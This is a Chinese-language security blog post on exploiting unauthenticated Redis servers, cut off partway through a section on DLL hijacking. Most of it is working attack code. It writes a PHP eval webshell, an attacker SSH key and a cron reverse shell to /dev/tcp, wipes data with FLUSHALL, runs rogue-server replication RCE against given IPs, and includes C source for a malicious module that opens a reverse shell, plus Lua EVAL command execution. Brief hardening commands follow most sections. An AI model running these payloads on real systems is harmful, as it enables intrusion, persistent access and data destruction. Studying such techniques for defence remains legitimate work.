<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="经常打的redis，经常催的redis🤔"><title>Redis未授权利用</title><link rel=canonical href=https://baozongwi.xyz/p/redis-unauthorized-access-exploit/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="Redis未授权利用"><meta property='og:description' content="经常打的redis，经常催的redis🤔"><meta property='og:url' content='https://baozongwi.xyz/p/redis-unauthorized-access-exploit/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='redis'><meta property='article:published_time' content='2025-09-22T20:24:20+08:00'><meta property='article:modified_time' content='2025-09-22T20:24:20+08:00'><meta name=twitter:title content="Redis未授权利用"><meta name=twitter:description content="经常打的redis，经常催的redis🤔"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1><h2 class=site-description>H@cking Th3 Fu1ure</h2></div></header><ol class=menu-social><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-map-pin"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
<span>travel</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#写入文件其他>写入文件&&其他</a><ol><li><a href=#写入webshell>写入webshell</a></li><li><a href=#写入ssh密钥>写入ssh密钥</a></li><li><a href=#写入定时任务>写入定时任务</a></li><li><a href=#获取清空数据>获取（清空）数据</a></li><li><a href=#修复>修复</a></li></ol></li><li><a href=#主从复制rce>主从复制RCE</a></li><li><a href=#加载恶意模块rce>加载恶意模块RCE</a></li><li><a href=#使用lua脚本rce><strong>使用Lua脚本RCE</strong></a></li><li><a href=#redis命令重命名滥用><strong>Redis命令重命名滥用</strong></a></li><li><a href=#dll劫持>DLL劫持</a></li><li><a href=#修复-1>修复</a></li><li><a href=#小结>小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/talk/>Talk</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/redis-unauthorized-access-exploit/>Redis未授权利用</a></h2><h3 class=article-subtitle>经常打的redis，经常催的redis🤔</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Sep 22, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>4 minute read</time></div></footer></div></header><section class=article-content><p>redis未授权利用，确认其是否存活</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>redis-cli -h &lt;Target-IP&gt; -p &lt;Target-Port&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>info
</span></span></code></pre></td></tr></table></div></div><p>可以说是最火热的姿势了，经常用到，这里我介绍几种我知道的</p><h2 id=写入文件其他>写入文件&&其他</h2><p>这里分很多种，得知web根目录写入webshell，写入ssh密钥，写入定时任务反弹shell，还有获取（清空）数据</p><h3 id=写入webshell>写入webshell</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>CONFIG SET dir /var/www/html
</span></span><span class=line><span class=cl>CONFIG SET dbfilename shell.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SET payload <span class=s2>&#34;&lt;?php @eval(</span><span class=nv>$_POST</span><span class=s2>[&#39;cmd&#39;]);?&gt;&#34;</span>
</span></span><span class=line><span class=cl>SAVE
</span></span></code></pre></td></tr></table></div></div><h3 id=写入ssh密钥>写入ssh密钥</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>CONFIG SET dir /home/root/.ssh
</span></span><span class=line><span class=cl>CONFIG SET dbfilename authorized_keys
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SET payload <span class=s2>&#34;ssh-rsa AAAAB3NzaC1yc2E...攻击者公钥&#34;</span>
</span></span><span class=line><span class=cl>SAVE
</span></span></code></pre></td></tr></table></div></div><h3 id=写入定时任务>写入定时任务</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>CONFIG SET dir /var/spool/cron
</span></span><span class=line><span class=cl>CONFIG SET dbfilename root
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 写入定时任务（每分钟反弹Shell）</span>
</span></span><span class=line><span class=cl>SET payload <span class=s2>&#34;* * * * * bash -i &gt;&amp; /dev/tcp/攻击者IP/端口 0&gt;&amp;1&#34;</span>
</span></span><span class=line><span class=cl>SAVE
</span></span></code></pre></td></tr></table></div></div><h3 id=获取清空数据>获取（清空）数据</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 删库</span>
</span></span><span class=line><span class=cl>FLUSHALL
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## 查看键值</span>
</span></span><span class=line><span class=cl>KEYS *
</span></span><span class=line><span class=cl>GET &lt;key&gt;
</span></span></code></pre></td></tr></table></div></div><h3 id=修复>修复</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># linux</span>
</span></span><span class=line><span class=cl><span class=c1>## 降权运行Redis</span>
</span></span><span class=line><span class=cl>useradd -r redis <span class=o>&amp;&amp;</span> chown -R redis:redis /var/lib/redis
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## 配置文件限制</span>
</span></span><span class=line><span class=cl>CONFIG SET dir /var/lib/redis
</span></span><span class=line><span class=cl>CONFIG SET dbfilename dump.rdb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## 禁用高危命令</span>
</span></span><span class=line><span class=cl>CONFIG SET rename-command FLUSHALL <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>CONFIG SET rename-command CONFIG <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>CONFIG SET rename-command SAVE <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># windows</span>
</span></span><span class=line><span class=cl><span class=c1>## 创建专用低权限用户</span>
</span></span><span class=line><span class=cl>net user redisuser <span class=s2>&#34;P@ssw0rd&#34;</span> /add /expires:never
</span></span><span class=line><span class=cl>icacls <span class=s2>&#34;C:\Program Files\Redis&#34;</span> /grant redisuser:<span class=o>(</span>OI<span class=o>)(</span>CI<span class=o>)</span>F
</span></span></code></pre></td></tr></table></div></div><h2 id=主从复制rce>主从复制RCE</h2><p>只要未授权访问+未禁用<code>SLAVEOF</code></p><ul><li>Redis 主从复制时，<strong>主节点（Master）</strong> 会将自己的数据（包括RDB文件）同步到 <strong>从节点（Slave）</strong> 。</li><li>攻击者可以伪造一个 <strong>恶意主节点</strong> ，强制目标 Redis（作为从节点）同步恶意数据（如<code>.so</code>文件、SSH密钥、WebShell等）。</li></ul><p>也有可以一键利用的工具 <a class=link href=https://github.com/n0b0dyCN/redis-rogue-server target=_blank rel=noopener>https://github.com/n0b0dyCN/redis-rogue-server</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## 编译工具</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> RedisModulesSDK/exp/
</span></span><span class=line><span class=cl>make
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## 使用</span>
</span></span><span class=line><span class=cl>python3 redis-rogue-server.py --rhost 39.98.116.123 --lhost 160.30.231.213
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>r
</span></span><span class=line><span class=cl>160.30.231.213
</span></span><span class=line><span class=cl><span class=m>9999</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nc -lvnp <span class=m>9999</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## 获取交互shell</span>
</span></span><span class=line><span class=cl>script /dev/null
</span></span></code></pre></td></tr></table></div></div><p>修复，直接禁用主从复制命令，以及限制只读权限</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 彻底禁用主从复制命令</span>
</span></span><span class=line><span class=cl>CONFIG SET rename-command SLAVEOF <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 或限制为只读从节点（仍需密码）</span>
</span></span><span class=line><span class=cl>replica-read-only yes
</span></span></code></pre></td></tr></table></div></div><h2 id=加载恶意模块rce>加载恶意模块RCE</h2><p>Redis 4.0+（（支持动态模块加载的版本）并且需攻击者能上传恶意<code>.so</code>文件）</p><p>这个打法和主从复制很类似，都是加载恶意so等模块进行利用。</p><p>创建恶意模块，注册可以反弹shell的恶意方法，再注册<code>EVILCMD</code>命令可触发恶意<code>EvilCommand</code>方法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&#34;redismodule.h&#34;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>EvilCommand</span><span class=p>(</span><span class=n>RedisModuleCtx</span> <span class=o>*</span><span class=n>ctx</span><span class=p>,</span> <span class=n>RedisModuleString</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=kt>int</span> <span class=n>argc</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;bash -i &gt;&amp; /dev/tcp/攻击者IP/端口 0&gt;&amp;1&#34;</span><span class=p>);</span> <span class=c1>// 反弹Shell
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>return</span> <span class=n>REDISMODULE_OK</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>RedisModule_OnLoad</span><span class=p>(</span><span class=n>RedisModuleCtx</span> <span class=o>*</span><span class=n>ctx</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>RedisModule_CreateCommand</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=s>&#34;EVILCMD&#34;</span><span class=p>,</span> <span class=n>EvilCommand</span><span class=p>,</span> <span class=s>&#34;readonly&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>REDISMODULE_OK</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//gcc -shared -fPIC -o evilmodule.so evilmodule.c $(pkg-config --cflags --libs hiredis)
</span></span></span></code></pre></td></tr></table></div></div><p>传入目标服务器之后进行加载（局限性还挺大）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>MODULE LOAD /tmp/evilmodule.so
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>EVILCMD
</span></span></code></pre></td></tr></table></div></div><p>当然也有现成的项目供我们使用 <a class=link href=https://github.com/n0b0dyCN/RedisModules-ExecuteCommand target=_blank rel=noopener>https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
</span></span><span class=line><span class=cl><span class=nb>cd</span> RedisModules-ExecuteCommand <span class=o>&amp;&amp;</span> make
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## 想办法传上去</span>
</span></span><span class=line><span class=cl>MODULE LOAD /tmp/exp.so
</span></span><span class=line><span class=cl>system.exec <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/攻击者IP/端口 0&gt;&amp;1&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>修复，禁用模块加载，以及重命名模块命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 禁用模块系统</span>
</span></span><span class=line><span class=cl>CONFIG SET enable-module-command no
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 或重命名模块命令</span>
</span></span><span class=line><span class=cl>CONFIG SET rename-command MODULE <span class=s2>&#34;&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=使用lua脚本rce><strong>使用Lua脚本RCE</strong></h2><ul><li>Redis &lt; 7.4.2</li><li>Redis &lt; 7.2.7</li><li>Redis &lt; 6.2.17</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>EVAL <span class=s2>&#34;os.execute(&#39;cmd.exe /C your_command_here&#39;)&#34;</span> <span class=m>0</span>
</span></span></code></pre></td></tr></table></div></div><p>修复，暂时禁用EVAL还有就是升级版本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 升级到安全版本：</span>
</span></span><span class=line><span class=cl><span class=c1># Redis &gt;= 7.4.2 / &gt;= 7.2.7 / &gt;= 6.2.17</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 临时缓解（禁用EVAL）</span>
</span></span><span class=line><span class=cl>CONFIG SET rename-command EVAL <span class=s2>&#34;&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=redis命令重命名滥用><strong>Redis命令重命名滥用</strong></h2><p>只要未禁用<code>CONFIG</code>命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>CONFIG GET rename-command
</span></span></code></pre></td></tr></table></div></div><p>如果返回为空说明未做限制，这里以禁用FLUSHALL为例子</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>CONFIG SET rename-command FLUSHALL <span class=s2>&#34;disabled_flushall&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>我们可以重新命名config</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>CONFIG SET rename-command CONFIG <span class=s2>&#34;newconfig&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>newconfig SET requirepass <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># 恢复默认名</span>
</span></span><span class=line><span class=cl>newconfig SET rename-command FLUSHALL <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>FLUSHALL
</span></span></code></pre></td></tr></table></div></div><h2 id=dll劫持>DLL劫持</h2><p>上面说的那几点，都是针对于Linux的redis未授权服务，但是如果是windows的话，就不能那么来进行getshell了，这里使用到一个常见姿势，DLL劫持，通常而言windows适应的默认版本都是受影响的范围，这里以3.0.504为demo进行测试 <strong>Redis for Windows</strong> <strong>3.0.504及以下</strong></p><p><a class=link href=https://www.cnblogs.com/sup3rman/p/16803408.html target=_blank rel=noopener>https://www.cnblogs.com/sup3rman/p/16803408.html</a></p><p><a class=link href=https://xz.aliyun.com/news/13892 target=_blank rel=noopener>https://xz.aliyun.com/news/13892</a></p><p>主要参考这两篇文章的原理，利用的话，可以以 <strong>春秋云镜MagicRelay</strong>来进行实验</p><p>最开始的redis入口，即使第一次劫持失败了，也依旧可以继续尝试，但是一旦成功了一次，如果选择下线就不能成功第二次了，并且其中修改shellcode前，产生项目的命令必须为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python DLLHijacker.py C:<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\d</span>bghelp.dll
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python DLLHijacker.py dbghelp.dll
</span></span></code></pre></td></tr></table></div></div><p>并且是win11的<code>dbghelp.dll</code>，用来编译的工具</p><p>VS2022 ：https://github.com/Byxs20/dll_hijack</p><p>VS2019 ： <a class=link href=https://github.com/kiwings/DLLHijacker target=_blank rel=noopener>https://github.com/kiwings/DLLHijacker</a></p><p>VS2022本来之前使用的先知文章的作者的项目，但是不知道为什么他下线了，喜欢藏是吧，幸好我存了，但是我懒得发GitHub，阿B就发了，里面也有完整的DLL和如何使用VS2022去替换shellcode之后处理的过程，先生成shellcode</p><p><img src=/p/redis-unauthorized-access-exploit/1.png width=351 height=186 srcset="/p/redis-unauthorized-access-exploit/1_hu_d4a3d7360a8c5206.png 480w, /p/redis-unauthorized-access-exploit/1_hu_892ff0a10c3369ac.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=188 data-flex-basis=452px></p><p><img src=/p/redis-unauthorized-access-exploit/2.png width=2407 height=1422 srcset="/p/redis-unauthorized-access-exploit/2_hu_efcabccecc8e6dc8.png 480w, /p/redis-unauthorized-access-exploit/2_hu_b38c077b78aa1544.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=169 data-flex-basis=406px></p><p>打开项目属性，</p><p>1、设置运行库为多线程 (/MT 或 /MTd)：</p><ul><li>在属性页面中，导航到：配置属性 > C/C++ > 代码生成。</li><li>找到 “运行库”（Runtime Library）选项。</li><li>如果当前是 Release 配置（截图中您已选择 Release x64），设置为 “多线程 (/MT)”。</li><li>如果是 Debug 配置，设置为 “多线程调试 (/MTd)”。</li><li>确保在顶部下拉菜单中选择正确的配置（Release 或 Debug）。</li></ul><p>2、禁用安全检查 (/GS)：</p><ul><li>仍在 配置属性 > C/C++ > 代码生成 页面。</li><li>找到 “安全检查”（Buffer Security Check）选项。</li><li>设置为 “禁用安全检查 (/GS-)”。</li></ul><p>3、关闭生成清单：</p><ul><li>导航到：配置属性 > 链接器 > 清单文件。</li><li>找到 “生成清单”（Generate Manifest）选项。</li><li>设置为 “否 (/MANIFEST:NO)”。</li></ul><p><img src=/p/redis-unauthorized-access-exploit/3.png width=1200 height=818 srcset="/p/redis-unauthorized-access-exploit/3_hu_8c53867a5201a40a.png 480w, /p/redis-unauthorized-access-exploit/3_hu_6300fbdc5ffd2f93.png 1024w" loading=lazy alt=img class=gallery-image data-flex-grow=146 data-flex-basis=352px></p><p><img 